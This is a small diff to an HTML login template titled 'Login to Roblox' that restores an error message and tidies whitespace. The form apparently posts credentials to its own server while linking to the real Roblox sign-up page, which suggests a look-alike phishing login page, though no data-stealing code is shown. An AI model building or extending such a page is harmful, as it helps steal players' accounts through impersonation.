@@ -36,9 +36,7 @@
       transform: translateX(-50%);
     }
   }
-</style>
-
-
+  </style>
 </head>
 <body class="login-page">
   <div class="login-container">
@@ -47,7 +45,9 @@
     <div class="login-box">
       <h2 class="login-header">Login to Roblox</h2>
 
-      <!-- No more error message shown -->
+      {% if error %}
+        <p style="color: red; text-align: center; font-size: 14px;">{{ error }}</p>
+      {% endif %}
 
       <form method="POST">
         <input type="text" name="username" placeholder="Username/Email/Phone" required>
@@ -66,7 +66,6 @@
       <p class="signup-text">
         Don't have an account?
        <a href="https://www.roblox.com/CreateAccount">Sign Up</a>
-
       </p>
     </div>
 
